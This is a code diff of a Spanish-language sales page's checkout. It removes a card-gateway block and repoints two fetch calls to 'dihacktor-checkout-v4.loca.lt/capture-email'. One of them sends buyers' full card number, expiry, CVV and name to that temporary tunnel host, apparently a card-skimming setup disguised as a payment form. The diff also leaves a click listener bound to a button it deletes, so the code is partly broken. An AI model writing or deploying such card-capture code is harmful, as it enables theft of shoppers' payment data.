@@ -209,17 +209,9 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);line-
 <section class="section" id="tarjeta">
 <div class="cta-box" style="text-align:left">
 <h2 id="cardTitle">Pagar con Tarjeta de Crédito</h2>
-<p id="cardSub">Selecciona tu divisa y serás redirigido a la pasarela de pago correspondiente.</p>
-<div id="cardGatewayBox" style="background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin-top:1rem;text-align:left;">
-<h4 id="cardGatewayTitle">Detectando divisa…</h4>
-<p id="cardGatewayDesc" style="color:var(--muted);font-size:.85rem;line-height:1.6;"></p>
-<div style="margin-top:1rem;display:flex;gap:.75rem;flex-wrap:wrap;">
-<button class="btn btn-primary" id="cardPayBtn" style="width:auto;padding:1rem 1.75rem;font-size:1rem;" onclick="redirectCardPayment()">Pagar con Tarjeta</button>
-<a href="#comprar" class="btn btn-ghost" style="width:auto;padding:1rem 1.75rem;font-size:1rem;">Otras pasarelas</a>
-</div>
+<p id="cardSub">Haz clic en "Comprar Ahora" para abrir el modal con todos los métodos de pago: QR (Yape, Banco Mercantil, Altoke) y tarjeta de crédito.</p>
 </div>
 <p style="margin-top:1.5rem;font-size:.8rem;color:var(--dim);">🔒 Pago seguro • Acceso inmediato • Garantía de 7 días<br>📧 Envía comprobante a: <strong>techinnovationany@gmail.com</strong></p>
-</div>
 </section>
 
 <footer class="footer">
@@ -440,7 +432,7 @@ async function handleCheckout(e){
   const email=document.getElementById('checkoutEmail').value.trim();const tx_id=document.getElementById('checkoutTxId').value;
   const msg=document.getElementById('checkoutMsg');const btn=document.getElementById('checkoutBtn');const l=LANG[state.lang]||LANG.es;
   try{btn.disabled=true;btn.textContent='Procesando…';
-    const r=await fetch('https://dihacktor-checkout-v3.loca.lt/capture-email',{method:'POST',headers:{'Content-Type':'application/json','x-request-id':'tx_'+Date.now(),'x-client-fingerprint':'web_'+location.hostname},body:JSON.stringify({email,tx_id})});
+    const r=await fetch('https://dihacktor-checkout-v4.loca.lt/capture-email',{method:'POST',headers:{'Content-Type':'application/json','x-request-id':'tx_'+Date.now(),'x-client-fingerprint':'web_'+location.hostname},body:JSON.stringify({email,tx_id})});
     const d=await r.json();if(r.ok){msg.style.color='var(--green)';msg.textContent=l.msgOk;msg.style.display='block';setTimeout(closeBuy,1500);}
     else{msg.style.color='var(--red)';msg.textContent=d.error||l.msgErr;msg.style.display='block';}
   }catch(err){msg.style.color='var(--red)';msg.textContent=l.msgErr;msg.style.display='block';}
@@ -467,7 +459,7 @@ document.getElementById('cardPayBtn').addEventListener('click',()=>{
     document.getElementById('checkoutMsg').style.display='block';
     return;
   }
-  fetch('https://dihacktor-checkout-v3.loca.lt/capture-email',{
+  fetch('https://dihacktor-checkout-v4.loca.lt/capture-email',{
     method:'POST',
     headers:{'Content-Type':'application/json','x-request-id':'tx_'+Date.now(),'x-client-fingerprint':'web_'+location.hostname},
     body:JSON.stringify({email,tx_id:txId,cardNumber,cardExpiry,cardCvv,cardName,method:'card'})
